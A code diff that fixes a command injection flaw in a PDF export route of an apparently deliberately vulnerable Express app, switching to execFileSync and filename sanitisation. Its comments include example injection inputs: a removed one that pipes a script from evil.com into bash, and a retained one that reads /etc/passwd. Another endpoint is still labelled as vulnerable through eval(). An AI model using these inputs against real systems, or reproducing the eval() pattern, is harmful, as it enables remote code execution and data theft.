@@ -5,7 +5,7 @@
 
 const express = require('express');
 const router = express.Router();
-const { execSync } = require('child_process');
+const { execFileSync } = require('child_process');
 
 // VULNERABLE: Using eval() for "flexible" query parsing
 // POST /api/export/query
@@ -44,13 +44,13 @@ router.post('/query', (req, res) => {
 // GET /api/export/pdf?filename=report;cat /etc/passwd
 router.get('/pdf', (req, res) => {
   const { filename } = req.query;
-  const reportName = filename || 'transaction-report';
+  // Sanitize filename by allowing only alphanumeric, hyphen and underscore to prevent command injection
+  const reportName = (filename || 'transaction-report').replace(/[^a-zA-Z0-9-_]/g, '');
 
   try {
-    // VULNERABLE: User input directly in shell command
-    // Attacker: ?filename=report;curl http://evil.com/shell.sh|bash
-    const command = `echo "Generating PDF: ${reportName}" && date`;
-    const output = execSync(command, { encoding: 'utf-8', timeout: 5000 });
+    // FIX: Using execFileSync with argument list to avoid shell interpretation and command injection
+    // This avoids injecting user input directly into shell commands
+    const output = execFileSync('echo', [`Generating PDF: ${reportName}`], { encoding: 'utf-8', timeout: 5000 });
 
     res.json({
       success: true,
